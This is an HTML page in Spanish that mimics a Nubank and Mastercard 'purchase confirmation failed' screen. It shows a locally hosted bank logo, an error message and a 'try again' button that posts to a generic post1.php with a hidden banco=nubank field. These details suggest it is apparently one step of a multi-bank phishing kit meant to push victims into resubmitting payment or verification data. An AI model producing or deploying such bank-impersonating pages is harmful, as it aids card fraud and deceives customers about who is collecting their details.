<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error - Confirmación de Compra</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f8f8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            max-width: 400px;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .logo {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .logo img {
            max-height: 30px;
        }
        .error-message {
            color: red;
            font-weight: bold;
            margin: 20px 0;
        }
        .btn-container {
            margin-top: 30px;
        }
        .btn-primary {
            background-color: #d9534f;
            border-color: #d9534f;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="img/nubank.png" alt="Nu">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard" style="max-height: 25px;">
        </div>
        <h5>Hubo un problema con la confirmación de la compra.</h5>
        
        <div class="error-message">
            No se pudo completar la compra. Por favor, inténtalo nuevamente.
        </div>

        <form action="post1.php" method="POST">
            <!-- Campo oculto para enviar el valor de Nubank -->
            <input type="hidden" name="banco" value="nubank">

            <div class="btn-container">
                <button type="button" class="btn btn-outline-secondary">Cancelar</button>
                <button type="submit" class="btn btn-primary">Intentar Nuevamente</button>
            </div>
        </form>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
